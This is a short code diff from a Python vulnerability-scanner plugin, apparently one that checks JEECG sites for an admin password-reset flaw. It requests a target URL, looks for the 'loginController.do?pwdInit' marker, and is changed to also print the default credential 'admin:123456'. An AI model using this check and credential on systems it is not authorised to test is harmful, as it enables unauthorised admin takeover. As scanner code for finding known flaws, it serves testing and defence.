@@ -24,7 +24,7 @@ class jeecg_pwd_reset_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"loginController.do?pwdInit" in req.text:
-                cprint("[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: "+vulnurl, "red")
+                cprint("[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: "+vulnurl+"\tadmin:123456", "red")
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
